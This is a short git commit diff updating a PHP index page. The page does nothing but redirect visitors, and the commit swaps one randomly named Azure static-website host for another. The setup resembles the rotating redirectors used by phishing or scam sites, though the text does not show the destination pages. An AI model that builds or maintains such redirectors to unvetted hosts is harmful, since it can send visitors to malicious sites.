ac14417f0b0e0ac818f9298804defccad9eca131
mancillajoaquin204 <mancillajoaquin204@gmail.com>
2025-02-10 22:58:12 +0530

    Update index.php

--- index.php
+++ index.php
@@ -2,7 +2,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://prayagcorefix99.z13.web.core.windows.net/");
+header("Location: https://perposecorede3.z16.web.core.windows.net/");
  
 exit;
 ?>
